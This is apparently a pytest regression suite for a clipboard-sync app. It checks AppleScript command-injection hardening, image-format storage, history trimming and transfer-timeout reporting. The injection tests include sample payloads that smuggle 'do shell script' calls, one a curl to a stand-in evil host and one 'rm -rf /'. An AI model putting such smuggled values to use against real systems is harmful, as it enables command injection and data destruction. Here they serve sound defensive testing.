"""Regression tests for the clipboard/transfer fix batch.

Covers:
1. macOS osascript fallback: peer-supplied URLs/file paths travel through
   the subprocess argv ('on run argv') and are never interpolated into the
   AppleScript source (command-injection fix).
2. image_fmt hint exposure through history storage and the web API
   (mobile BMP/TIFF rendering fix).
3. In-memory trim selection aligned with the DB trim key
   (timestamp DESC, entry_id DESC) under sender clock skew.
4. FILE_COMPLETE wait timeout reported as "error_timeout", not
   "peer_offline".
"""

import os
import sqlite3
import subprocess
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from internal.clipboard import clipboard_darwin as darwin
from internal.clipboard.format import ClipboardContent, ContentType
from internal.clipboard.history_db import ClipboardHistoryDB


# ── #1 osascript argv passing (macOS write fallback) ──────────────────

class _RunCapture:
    """Stand-in for subprocess.run that records every command."""

    def __init__(self):
        self.commands = []

    def __call__(self, cmd, **kwargs):
        self.commands.append(cmd)
        return subprocess.CompletedProcess(cmd, 0)


@pytest.fixture
def run_capture(monkeypatch):
    cap = _RunCapture()
    monkeypatch.setattr(darwin.subprocess, "run", cap)
    return cap


EVIL_URL = '" & do shell script "curl http://evil.example/x" & "'


def test_osascript_argv_cmd_passes_values_as_arguments():
    cmd = darwin._osascript_argv_cmd('on run argv\nend run', 'a"b', "-flag")
    assert cmd[:3] == ["osascript", "-e", "on run argv\nend run"]  # static source
    assert cmd[3:] == [darwin._ARGV_MARK + 'a"b', darwin._ARGV_MARK + "-flag"]


def test_set_url_never_interpolates_url_into_script(run_capture):
    w = darwin._ClipboardWriter()
    w._set_url(EVIL_URL.encode("utf-8"))

    assert len(run_capture.commands) == 1
    cmd = run_capture.commands[0]
    script = cmd[2]
    # Payload must ride in argv, never appear in the AppleScript source.
    assert EVIL_URL not in script
    assert "do shell script" not in script
    assert script.startswith("on run argv")
    assert cmd[3].startswith(darwin._ARGV_MARK)
    assert cmd[3][1:] == EVIL_URL


def test_set_url_with_quotes_round_trips_via_argv(run_capture):
    w = darwin._ClipboardWriter()
    url = 'https://example.com/He said "hi".html'
    w._set_url(url.encode("utf-8"))

    cmd = run_capture.commands[0]
    assert cmd[3][1:] == url  # survives verbatim through argv
    assert url not in cmd[2]  # and is not in the source


def test_set_url_empty_value_is_a_noop(run_capture):
    w = darwin._ClipboardWriter()
    w._set_url(b"   \n")
    assert run_capture.commands == []


def test_set_files_never_interpolates_paths_into_script(run_capture):
    w = darwin._ClipboardWriter()
    paths = [
        '/Users/x/He said "hi".txt',
        "-dash-leading-name.txt",
        '"; do shell script "rm -rf /"; "',
        "/Users/x/正常 文件名.png",
    ]
    w._set_files("\n".join(paths).encode("utf-8"))

    assert len(run_capture.commands) == 1
    cmd = run_capture.commands[0]
    script = cmd[2]
    for p in paths:
        assert p not in script
    assert "do shell script" not in script
    assert script.startswith("on run argv")
    args = cmd[3:]
    assert [a[1:] for a in args] == paths  # marker-prefixed, order preserved


def test_set_files_empty_list_is_a_noop(run_capture):
    w = darwin._ClipboardWriter()
    w._set_files(b"\n \n")
    assert run_capture.commands == []


# ── #2 image_fmt exposed through storage and web API ──────────────────

@pytest.fixture
def history_db(tmp_path):
    return ClipboardHistoryDB(
        storage_path=str(tmp_path / "history.db"), max_entries=50,
    )


def _bmp_entry(ts=1000.0):
    return ClipboardContent(
        types={ContentType.IMAGE_PNG: b"BM-fake-bmp-bytes"},
        timestamp=ts,
        image_fmt="bmp",
    )


def _text(body: str, ts: float) -> ClipboardContent:
    return ClipboardContent(
        types={ContentType.TEXT: body.encode("utf-8")}, timestamp=ts,
    )


def test_image_fmt_survives_add_and_reload(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=50)
    db.add(_bmp_entry())
    assert db.get_all()[0]["image_fmt"] == "bmp"

    # A fresh instance (app restart) restores the hint from the DB row.
    db2 = ClipboardHistoryDB(storage_path=path, max_entries=50)
    assert db2.get_all()[0]["image_fmt"] == "bmp"


class _StubCfg:
    device_id = "dev-local"
    device_name = "Local"
    peers = {}
    web_history_limit = 20


def test_api_history_exposes_image_fmt(history_db):
    history_db.add(_bmp_entry())

    from internal.web.api.history import get_history, get_history_item

    payload, status = get_history(history_db, _StubCfg())
    assert status == 200
    item = payload["items"][0]
    assert item["content_type"] == "IMAGE"
    assert item["image_fmt"] == "bmp"

    detail, status = get_history_item(
        {"entry_id": [str(item["entry_id"])]}, history_db, _StubCfg(),
    )
    assert status == 200
    assert detail["item"]["image_fmt"] == "bmp"
    assert detail["item"]["types"]["IMAGE"] == "Qk0tZmFrZS1ibXAtYnl0ZXM="


def test_legacy_db_without_image_fmt_column_migrates(tmp_path):
    """A pre-image_fmt database must ALTER-add the column, not fail."""
    path = tmp_path / "old.db"
    conn = sqlite3.connect(str(path))
    conn.execute(
        "CREATE TABLE history ("
        " entry_id INTEGER PRIMARY KEY, timestamp REAL NOT NULL,"
        " content_type TEXT NOT NULL DEFAULT '',"
        " text_preview TEXT NOT NULL DEFAULT '',"
        " types TEXT NOT NULL DEFAULT '{}',"
        " source_device TEXT NOT NULL DEFAULT '',"
        " source_app TEXT NOT NULL DEFAULT '',"
        " source_title TEXT NOT NULL DEFAULT '',"
        " pinned INTEGER NOT NULL DEFAULT 0,"
        " paste_count INTEGER NOT NULL DEFAULT 0)"
    )
    conn.execute(
        "INSERT INTO history (entry_id, timestamp, content_type, text_preview, types)"
        " VALUES (1, 1000.0, 'IMAGE', '[Image]', '{}')"
    )
    conn.commit()
    conn.close()

    db = ClipboardHistoryDB(storage_path=str(path), max_entries=50)
    entry = db.get_all()[0]
    assert entry["text_preview"] == "[Image]"
    assert entry["image_fmt"] == ""  # unknown -> clients fall back to PNG


def test_mobile_html_selects_mime_from_image_fmt():
    """The phone page must map fmt->MIME instead of hardcoding image/png."""
    static_dir = Path(__file__).resolve().parent.parent / "internal" / "web" / "static"
    html = (static_dir / "mobile.html").read_text(encoding="utf-8")
    assert "image/bmp" in html
    assert "image/tiff" in html
    assert "imageDataUrl(item)" in html  # called with the full item


# ── #3 memory trim aligned with DB trim key ───────────────────────────

def test_memory_trim_matches_db_trim_under_clock_skew(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=3)

    # Arrival order vs. timestamps skewed like remote senders' clocks.
    db.add(_text("X", ts=5000.0))  # arrives first, newest by clock
    db.add(_text("Y", ts=1000.0))
    db.add(_text("Z", ts=2000.0))
    assert len(db.get_all()) == 3

    db.add(_text("W", ts=1500.0))  # over limit -> trim one

    mem = {e["text_preview"] for e in db.get_all()}
    # Aligned rule keeps the top-3 by timestamp DESC: X(5000), Z(2000),
    # W(1500).  Arrival-order trimming would have dropped X instead.
    assert mem == {"X", "Z", "W"}

    conn = sqlite3.connect(path)
    rows = {
        r[0] for r in conn.execute(
            "SELECT text_preview FROM history WHERE pinned = 0"
        )
    }
    conn.close()
    assert rows == mem  # DB dropped exactly the same entry


def test_memory_trim_preserves_pinned_entries(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=3)
    db.add(_text("X", ts=5000.0))
    db.add(_text("Y", ts=1000.0))
    db.add(_text("Z", ts=2000.0))

    eid_y = next(e["entry_id"] for e in db.get_all()
                 if e["text_preview"] == "Y")
    assert db.batch_set_pinned([eid_y], True) == 1

    db.add(_text("W", ts=1500.0))  # 4 entries, 1 pinned -> keep top-2 unpinned

    previews = {e["text_preview"] for e in db.get_all()}
    assert previews == {"X", "Y", "Z"}  # W(1500) is the youngest unpinned drop

    conn = sqlite3.connect(path)
    rows = {r[0] for r in conn.execute("SELECT text_preview FROM history")}
    conn.close()
    assert rows == previews


# ── #4 FILE_COMPLETE wait timeout reason ─────────────────────────────

class TestFileCompleteTimeoutReason:
    def test_completion_wait_timeout_reports_error_timeout(self, tmp_path,
                                                           monkeypatch):
        from internal.sync import file_transfer as ft_mod
        from internal.sync.file_transfer import FileTransferManager

        monkeypatch.setattr(ft_mod, "COMPLETION_WAIT_TIMEOUT", 1.0)

        mgr = FileTransferManager("test-device", str(tmp_path / "out"))
        completions = []
        mgr.set_on_transfer_complete(
            lambda tid, ok, cancelled, status:
                completions.append((tid, ok, cancelled, status)),
        )

        f = tmp_path / "hello.bin"
        f.write_bytes(b"x" * 100)
        frames = []
        tid = mgr.send_file(str(f), frames.append)
        mgr.handle_message("file_ack", {"transfer_id": tid}, frames.append)

        deadline = time.time() + 15
        while not completions and time.time() < deadline:
            time.sleep(0.1)

        assert completions, "transfer never completed"
        done_tid, ok, cancelled, status = completions[0]
        assert done_tid == tid
        assert ok is False
        assert cancelled is False
        # A wait timeout is not a dropped connection -- it must not be
        # reported as peer_offline.
        assert status == "error_timeout"
